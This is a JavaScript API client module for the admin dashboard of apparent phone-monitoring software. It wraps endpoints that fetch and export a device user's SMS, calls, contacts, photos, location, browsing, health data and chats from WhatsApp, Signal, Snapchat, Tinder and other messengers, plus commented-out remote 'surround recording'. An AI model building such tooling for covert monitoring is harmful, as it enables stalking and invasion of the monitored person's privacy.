import api from './Index'
        
const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

const ApiUtils = {
  authLogin: async function (params) {
    try {
      const response = await api.post("Admin/AdminLogin", params);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getAllDeviceUser: async function (params) {
    try {
      const response = await api.get(`Home/GetAllDeviceUser?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getUserCardDetails: async function (params) {
    try {
      const response = await api.get(`CardDetail?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSnapchat: async function (params) {
    try {
      const response = await api.get(`Snapchat?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSnapchatChatByNumber: async function (params) {
    try {
      const response = await api.get(
        `/Snapchat/GetSnapchatByPhoneNumber?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getCallLogs: async function (params) {
    try {
      const response = await api.get(`CallLog?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSmsLogs: async function (params) {
    try {
      const response = await api.get(`SMS?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getNotes: async function (params) {
    try {
      const response = await api.get(`Notes?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getContacts: async function (params) {
    try {
      const response = await api.get(`Contacts?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getDeviceInfo: async function (params) {
    try {
      const response = await api.get(
        `DeviceUser/GetDeviceDetailByDeviceId?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  resetDevice: async function (params) {
    try {
      const response = await api.post(`DeviceUser/reset?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getGallery: async function (params) {
    try {
      const response = await api.get(`Gallery/GetAllGalleryTypewise?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getLocationInfo: async function (params) {
    try {
      const response = await api.get(`Location?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getAnalyticsDetails: async function () {
    try {
      const response = await api.get("Analytics/GetAnalyTicsDetails");
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getDownloadYearChart: async function (params) {
    try {
      const response = await api.get(
        `Download/GetAllDownloadYearAndMonthWise?year=${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSMSLogByNumber: async function (params) {
    try {
      const response = await api.get(`SMS/GetAllSMSLogByPhoneNumber?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getCallLogByNumber: async function (params) {
    try {
      const response = await api.get(
        `CallLog/GetAllCallLogByPhoneNumber?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },  
  getGmailLogDetailsByExcel: async function (params) {
    try {
      const response = await api.get(`Gmail/GetGmailLogDetailsByExcel?${params}&timeZone=${timeZone}`, {
        responseType: "blob",
      });
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getGmailsLogs: async function (params) {
    try {
      const response = await api.get(`/Gmail/GetAllGmails?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getInternetHistory: async function (params) {
    try {
      const response = await api.get(`/InternetHistory?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getWhatsappLogs: async function (params) {
    try {
      const response = await api.get(`/Whatsapp?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getWhatsappChatByNumber: async function (params) {
    try {
      const response = await api.get(
        `/Whatsapp/GetWhatsAppByPhoneNumber?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getWifiNetworksLogs: async function (params) {
    try {
      const response = await api.get(`/WiFiNetworks?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getViberLogs: async function (params) {
    try {
      const response = await api.get(`/Viber?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getTinderLogs: async function (params) {
    try {
      const response = await api.get(`/Tinder?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
    getSignalLogs: async function (params) {
    try {
      const response = await api.get(`/Signal?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
    getSignalByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Signal/GetSignalByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSkypeLogs: async function (params) {
    try {
      const response = await api.get(`/Skype?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getLineLogs: async function (params) {
    try {
      const response = await api.get(`/Line?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getKikLogs: async function (params) {
    try {
      const response = await api.get(`/Kik?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getInstalledAppLogs: async function (params) {
    try {
      const response = await api.get(`/InstalledApp?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getFacebookLogs: async function (params) {
    try {
      const response = await api.get(`/Facebook?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getAnalyTicsDetailsByYear: async function (params) {
    try {
      const response = await api.get(
        `Analytics/GetAnalyTicsDetailsByYear?year=${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getKikByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Kik/GetKikByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSkypeByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Skype/GetSkypeByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getLineByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Line/GetLineByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getViberByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Viber/GetViberByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getFaceBookByContactPersonName: async function (params) {
    try {
      const response = await api.get(
        `/Facebook/GetFaceBookByContactPersonName?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  // setRemoteRecording: async function (params) {
  //   try {
  //     const response = await api.post("/Notification/SendNotification", params);
  //     return response;
  //   } catch (error) {
  //     throw error.response;
  //   }
  // },
  // getSurroundRecordList: async function (params) {
  //   try {
  //     const response = await api.get(`/SurroundRecording?${params}`);
  //     return response;
  //   } catch (error) {
  //     throw error.response;
  //   }
  // },
  getCallLogDetailsByExcel: async function (params) {
    try {
      const response = await api.get(
        `CallLog/GetCallLogDetailsByExcel?${params}&timeZone=${timeZone}`,
        { responseType: "blob" },
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getSmsLogDetailsByExcel: async function name(params) {
    try {
      const response = await api.get(
        `SMS/GetSmsLogDetailsByExcel?${params}&timeZone=${timeZone}`,
        { responseType: "blob" },
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getContactDetailsByExcel: async function (params) {
    try {
      const response = await api.get(
        `Contacts/GetContactDetailsByExcel?${params}`,
        { responseType: "blob" },
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getScreenTimeDetail: async function (params) {
    try {
      const response = await api.get(`ScreenTime?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getTopAppScreenTime: async function (params) {
    try {
      const response = await api.get(
        `ScreenTime/Top5AppAndScreenTime?${params}`,
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getCalendarDetail: async function (params) {
    try {
      const response = await api.get(`Calendar?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  downloadZip: async function (ids) {
    try {
      const response = await api.post("Gallery/DownloadZip", ids, {
        responseType: "blob", // important for files
        headers: {
          "Content-Type": "application/json",
        },
      });
      return response;
    } catch (error) {
      throw error.response || error;
    }
  },

  getLocationDetailsByExcel: async function (params) {
    try {
      const response = await api.get(
        `Location/GetLocationsDetailsByExcel?${params}`,
        { responseType: "blob" },
      );
      return response;
    } catch (error) {
      throw error.response;
    }
  },

  getMessagesByExcel: async function (
    messenger,
    DeviceUserId,
    fromDate,
    toDate,
    bodyIds,
  ) {
    try {
      const queryParams = new URLSearchParams();
      queryParams.append("messenger", messenger);
      queryParams.append("DeviceUserId", DeviceUserId);
      queryParams.append("timeZone", timeZone);

      if (fromDate) queryParams.append("from", fromDate);
      if (toDate) queryParams.append("to", toDate);

      const response = await api.post(
        `exports/messages?${queryParams.toString()}`,
        bodyIds,
        {
          responseType: "blob",
          headers: {
            Accept: "*/*",
            "Content-Type": "application/json",
          },
        },
      );

      return response;
    } catch (error) {
      throw error.response;
    }
  },

  getPhoneStorage: async function (params) {
    try {
      const response = await api.get(`/UploadDocumentsFolder?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  FolderDetailed: async function (Url, params) {
    try {
      const response = await api.post(`${Url}`, params);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  DownloadFolderZip: async function (Url, payload) {
    try {
      const response = await api.post(Url, payload, {
        responseType: "blob",
      });
      return response;
    } catch (error) {
      throw error.response || error;
    }
  },
  getAppleHealthLogs: async function (params) {
    try {
      const response = await api.get(`/AppleHealthData?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  getLinkedInLogs: async function (params) {
    try {
      const response = await api.get(`/LinkedIn?${params}`);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  DeleteGroupRange: async function (Url, params) {
    try {
      const response = await api.delete(`${Url}`, { data: params });
      return response;
    } catch (error) {
      throw error.response;
    }
  },
  DeleteRange: async function (Url, params) {
    try {
      const response = await api.post(`${Url}`, params);
      return response;
    } catch (error) {
      throw error.response;
    }
  },
};
export default ApiUtils
